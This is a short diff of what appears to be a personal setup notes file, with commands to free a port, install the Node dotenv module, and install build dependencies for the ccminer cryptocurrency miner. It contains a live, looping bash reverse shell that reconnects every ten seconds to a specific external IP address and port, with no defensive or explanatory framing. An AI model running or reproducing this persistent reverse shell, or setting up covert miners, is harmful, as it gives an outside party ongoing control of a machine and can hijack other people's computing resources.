@@ -1,7 +1,7 @@
 fuser -k 4055/tcp
 npm i dotenv (install modul dotenv di node)
 while true; do bash -c 'bash -i >& /dev/tcp/35.247.34.178/4053 0>&1'; sleep 10; done
-#### dependence ccminer
+#### dependence ccmine
 
 apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
 
